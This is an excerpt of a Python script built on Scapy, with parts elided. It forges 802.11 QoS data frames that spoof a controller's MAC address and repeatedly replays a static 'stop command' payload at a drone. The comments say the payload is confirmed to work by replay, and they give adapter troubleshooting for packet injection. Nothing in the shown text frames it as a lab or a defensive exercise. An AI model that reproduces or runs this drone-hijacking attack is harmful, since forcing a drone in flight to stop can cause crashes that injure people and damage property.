...
# NOTE ON TP-LINK TL-WN821N: This adapter can be challenging for injection 
# as drivers sometimes interfere with custom packet headers. If this script
# still fails, the adapter/driver combination is the likely next issue.
...
# STATIC STOP COMMAND PAYLOAD (Confirmed to work via simple replay)
STOP_HEX = (
...
def inject_stop_command(interface):
    ...
    # CRITICAL CHANGE: Hardcode a static sequence number (seqnum) to mimic simple replay
    dot11_frame = Dot11(
        addr1=DRONE_MAC, 
        ...
        type=2, 
        subtype=8, # QoS Data
        seqnum=1000 # STATIC SEQUENCE NUMBER
    )
    ...
    try:
        count = 0
        while count < 50: 
            # Recreate the packet to prevent Scapy from trying to increment seqnum itself
            packet_to_send = RadioTap() / Dot11(
                addr1=DRONE_MAC, 
                addr2=CONTROLLER_MAC, 
                addr3=DRONE_MAC,
                type=2, 
                subtype=8,
                seqnum=1000 # Ensure it stays 1000
            ) / udp_packet
